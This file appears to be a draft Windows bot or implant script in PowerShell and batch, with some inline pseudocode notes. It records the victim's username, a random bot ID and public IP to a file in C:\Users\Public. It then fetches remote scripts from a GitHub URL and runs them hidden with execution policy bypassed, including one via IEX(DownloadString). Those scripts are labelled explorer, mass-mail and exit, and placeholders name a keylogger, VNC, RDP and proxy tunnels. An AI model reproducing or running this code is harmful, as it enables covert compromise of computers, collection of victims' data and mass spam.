
mkdir Looney!
exit

C:

if (!(Test-Path "C:\Users\Public"))
{
	New-Item -Path 'C:\Users\Public' -ItemType Directory
	Set-Location -Path C:\Users\Public
}
else
{
	Set-Location -Path C:\Users\Public
}
	#check to see if unique id already received
	if (!(Test-Path "C:\Users\Public\received.txt"))
	{
		#USERNAME
		cmd /c echo %userprofile% > ClimateChange.txt
		#UNIQUE ID
		cmd /c mkdir %random%-%random%-%random%-%random% &&	dir > ClimateChange.txt
		#IP ADDRESS
			exip.py
				from requests import get

				ip = get('https://api.ipify.org').text
				print('Ip address=: {}'.format(ip))
			python.exe exip.py > ClimateChange.txt
		##ZIP CODE, TIMEZONE, LANG,VERSION,NETWORK INFO,..originating city, state/region, postal code, country name, ISP

		pastebin
		python fb
		git bash
		email providers with automation
		mail / smtp server
		ssh
		ftp
		
	}
	else
	{
		echo hawaii
	}

exit
	
#bot control
if (!(Test-Path "C:\Users\Public\2050-28476-13180-17245"))
{
	exit
}
else
{
	Set-Location -Path C:\Users\Public
	#commands for this specific bot
}








commands

#7zip

$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString("https://raw.githubusercontent.com/argene-nyc/sevilla/master/4stray.ps1"))

#ngrok

#files_simple http server

#files_sftp

#msrdp_socks

#msrdp_rdp

#ftp

#ssh

#gaming_servers

#web_hosting

#keylogger

#vnc

#rdp

#x11

#explorer
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/argene-nyc/sevilla/master/8exp1orer.ps1', '.\8exp1orer.ps1')
cmd /c start powershell -noexit -command "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 8exp1orer.ps1"

#mass-mail
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/argene-nyc/sevilla/master/7mail.ps1', '.\7mail.ps1')
cmd /c start powershell -noexit -command "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 7mail.ps1"

#exit file
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/argene-nyc/sevilla/master/10exit.ps1', '.\10exit.ps1')
cmd /c start powershell -noexit -command "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 10exit.ps1"

